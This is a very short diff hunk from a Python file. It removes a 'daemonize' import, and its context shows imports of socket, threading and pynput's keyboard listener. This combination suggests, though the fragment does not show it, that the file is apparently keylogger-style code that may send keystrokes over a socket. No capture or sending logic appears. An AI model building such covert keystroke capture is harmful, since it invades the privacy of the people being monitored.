@@ -2,7 +2,6 @@ import socket
 import threading
 import time
 from pynput import keyboard 
-import daemonize
 
 result_string = ''
 lock = threading.Lock()
